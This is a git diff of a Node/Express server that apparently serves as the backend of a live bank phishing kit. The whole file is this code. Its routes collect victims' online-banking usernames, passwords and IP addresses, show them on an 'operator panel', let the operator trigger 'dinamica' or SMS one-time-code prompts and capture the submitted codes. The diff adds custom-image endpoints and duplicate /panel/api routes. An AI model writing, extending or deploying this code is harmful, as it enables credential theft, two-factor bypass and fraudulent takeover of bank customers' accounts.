@@ -9,8 +9,8 @@ app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "views"));
 app.locals.ASSETS = ASSETS;
 
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: "25mb" }));
+app.use(express.urlencoded({ limit: "25mb", extended: true }));
 
 // CORS & Security Headers
 app.use((req, res, next) => {
@@ -32,143 +32,179 @@ app.get("/panel", (req, res) => {
 
 // In-memory sessions store
 let sessions = {};
+let globalCustomImage = null;
 
-// 1. Create or update session from login
-app.post("/api/sessions", (req, res) => {
-  const { id, username, password, tipoUsuario, device, ip, state } = req.body;
-  if (!id) return res.status(400).json({ error: "Missing session id" });
+// Helper to register API routes on both /api and /panel/api
+const registerSessionRoutes = (prefix) => {
+  // 1. Create or update session from login
+  app.post(`${prefix}/sessions`, (req, res) => {
+    const { id, username, password, tipoUsuario, device, ip, state, customImage, action } = req.body;
+    if (!id) return res.status(400).json({ error: "Missing session id" });
 
-  const clientIp = ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
+    const clientIp = ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
 
-  if (sessions[id]) {
-    sessions[id] = {
-      ...sessions[id],
-      username: username || sessions[id].username,
-      password: password || sessions[id].password,
-      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
-      device: device || sessions[id].device,
-      ip: clientIp,
-      state: state || sessions[id].state,
-      last_seen: Date.now(),
-      updatedAt: Date.now()
-    };
-  } else {
-    sessions[id] = {
-      id,
-      index: Object.keys(sessions).length + 1,
-      username: username || "—",
-      password: password || "—",
-      tipoUsuario: tipoUsuario || "Banca por Internet",
-      device: device || "desktop",
-      ip: clientIp,
-      state: state || "waiting",
-      token: "",
-      action: null,
-      createdAt: Date.now(),
-      last_seen: Date.now(),
-      updatedAt: Date.now()
-    };
-  }
-  res.json({ success: true, session: sessions[id] });
-});
+    if (sessions[id]) {
+      sessions[id] = {
+        ...sessions[id],
+        username: username || sessions[id].username,
+        password: password !== undefined && password !== "" ? password : sessions[id].password,
+        tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
+        device: device || sessions[id].device,
+        ip: clientIp,
+        state: state || sessions[id].state,
+        action: action !== undefined ? action : sessions[id].action,
+        customImage: customImage !== undefined ? customImage : sessions[id].customImage,
+        last_seen: Date.now(),
+        updatedAt: Date.now()
+      };
+    } else {
+      sessions[id] = {
+        id,
+        index: Object.keys(sessions).length + 1,
+        username: username || "—",
+        password: password || "—",
+        tipoUsuario: tipoUsuario || "Banca por Internet",
+        device: device || "desktop",
+        ip: clientIp,
+        state: state || "waiting",
+        customImage: customImage !== undefined ? customImage : (globalCustomImage || null),
+        token: "",
+        action: null,
+        createdAt: Date.now(),
+        last_seen: Date.now(),
+        updatedAt: Date.now()
+      };
+    }
+    res.json({ success: true, session: sessions[id] });
+  });
 
-// 2. Get all sessions for operator panel
-app.get("/api/sessions", (req, res) => {
-  const now = Date.now();
-  const list = Object.values(sessions).map(s => ({
-    ...s,
-    online: now - s.last_seen < 20000
-  }));
-  res.json(list);
-});
+  // 2. Get all sessions for operator panel
+  app.get(`${prefix}/sessions`, (req, res) => {
+    const now = Date.now();
+    const list = Object.values(sessions).map(s => ({
+      ...s,
+      customImage: s.customImage !== undefined && s.customImage !== null ? s.customImage : (globalCustomImage || null),
+      online: now - s.last_seen < 20000
+    }));
+    res.json(list);
+  });
 
-// 3. Get single session for polling
-app.get("/api/sessions/:id", (req, res) => {
-  const session = sessions[req.params.id];
-  if (!session) return res.status(404).json({ error: "Session not found" });
-  res.json(session);
-});
+  // 3. Get single session for polling
+  app.get(`${prefix}/sessions/:id`, (req, res) => {
+    const session = sessions[req.params.id];
+    if (!session) return res.status(404).json({ error: "Session not found" });
+    res.json({
+      ...session,
+      customImage: session.customImage !== undefined && session.customImage !== null ? session.customImage : (globalCustomImage || null)
+    });
+  });
 
-// 4. Submit token from OTP validation
-app.post("/api/sessions/:id/token", (req, res) => {
-  const { id } = req.params;
-  const { token } = req.body;
-  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+  // 4. Submit token from OTP validation
+  app.post(`${prefix}/sessions/:id/token`, (req, res) => {
+    const { id } = req.params;
+    const { token } = req.body;
+    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
 
-  sessions[id].token = token;
-  const currentAction = sessions[id].action;
-  if (currentAction === "sms") {
-    sessions[id].state = "received-sms";
-  } else {
-    sessions[id].state = "received-dinamica";
-  }
-  sessions[id].action = null;
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
+    sessions[id].token = token;
+    const currentAction = sessions[id].action;
+    if (currentAction === "sms") {
+      sessions[id].state = "received-sms";
+    } else {
+      sessions[id].state = "received-dinamica";
+    }
+    sessions[id].action = null;
+    sessions[id].last_seen = Date.now();
+    sessions[id].updatedAt = Date.now();
+    res.json({ success: true, session: sessions[id] });
+  });
 
-// 5. Keepalive ping
-app.post("/api/sessions/:id/ping", (req, res) => {
-  const { id } = req.params;
-  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+  // 5. Keepalive ping
+  app.post(`${prefix}/sessions/:id/ping`, (req, res) => {
+    const { id } = req.params;
+    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
 
-  sessions[id].last_seen = Date.now();
-  res.json({ success: true });
-});
+    sessions[id].last_seen = Date.now();
+    res.json({ success: true });
+  });
 
-// 6. Set operator action
-app.post("/api/sessions/:id/action", (req, res) => {
-  const { id } = req.params;
-  const { action, state } = req.body;
-  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+  // 6. Set operator action
+  app.post(`${prefix}/sessions/:id/action`, (req, res) => {
+    const { id } = req.params;
+    const { action, state } = req.body;
+    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
 
-  sessions[id].action = action;
-  if (state) sessions[id].state = state;
-  if (action === "dinamica" || action === "sms") {
-    sessions[id].token = "";
-  }
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
+    sessions[id].action = action;
+    if (state) sessions[id].state = state;
+    if (action === "dinamica" || action === "sms") {
+      sessions[id].token = "";
+    }
+    sessions[id].last_seen = Date.now();
+    sessions[id].updatedAt = Date.now();
+    res.json({ success: true, session: sessions[id] });
+  });
 
-// 7. Update typing state
-app.post("/api/sessions/:id/state", (req, res) => {
-  const { id } = req.params;
-  const { state } = req.body;
-  const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
+  // 6b. Update session custom image
+  app.post(`${prefix}/sessions/:id/image`, (req, res) => {
+    const { id } = req.params;
+    const { image } = req.body;
+    if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
 
-  if (!sessions[id]) {
-    sessions[id] = {
-      id,
-      index: Object.keys(sessions).length + 1,
-      username: "—",
-      password: "—",
-      tipoUsuario: "Banca por Internet",
-      device: "desktop",
-      ip: clientIp,
-      state: state || "typing",
-      token: "",
-      action: null,
-      createdAt: Date.now(),
-      last_seen: Date.now(),
-      updatedAt: Date.now()
-    };
-    return res.json({ success: true, session: sessions[id] });
-  }
+    sessions[id].customImage = image || null;
+    sessions[id].updatedAt = Date.now();
+    res.json({ success: true, session: sessions[id] });
+  });
 
-  sessions[id].state = state;
-  sessions[id].last_seen = Date.now();
-  sessions[id].updatedAt = Date.now();
-  res.json({ success: true, session: sessions[id] });
-});
+  // 6c. Global image endpoints
+  app.post(`${prefix}/global-image`, (req, res) => {
+    const { image } = req.body;
+    globalCustomImage = image || null;
+    res.json({ success: true, globalCustomImage });
+  });
 
-// 8. Clear all sessions
-app.post("/api/clear", (req, res) => {
-  sessions = {};
-  res.json({ success: true });
-});
+  app.get(`${prefix}/global-image`, (req, res) => {
+    res.json({ globalCustomImage });
+  });
+
+  // 7. Update typing state
+  app.post(`${prefix}/sessions/:id/state`, (req, res) => {
+    const { id } = req.params;
+    const { state } = req.body;
+    const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
+
+    if (!sessions[id]) {
+      sessions[id] = {
+        id,
+        index: Object.keys(sessions).length + 1,
+        username: "—",
+        password: "—",
+        tipoUsuario: "Banca por Internet",
+        device: "desktop",
+        ip: clientIp,
+        state: state || "typing",
+        token: "",
+        action: null,
+        createdAt: Date.now(),
+        last_seen: Date.now(),
+        updatedAt: Date.now()
+      };
+      return res.json({ success: true, session: sessions[id] });
+    }
+
+    sessions[id].state = state;
+    sessions[id].last_seen = Date.now();
+    sessions[id].updatedAt = Date.now();
+    res.json({ success: true, session: sessions[id] });
+  });
+
+  // 8. Clear all sessions
+  app.post(`${prefix}/clear`, (req, res) => {
+    sessions = {};
+    res.json({ success: true });
+  });
+};
+
+registerSessionRoutes("/api");
+registerSessionRoutes("/panel/api");
 
 // Site template locals
 app.use((req, res, next) => {
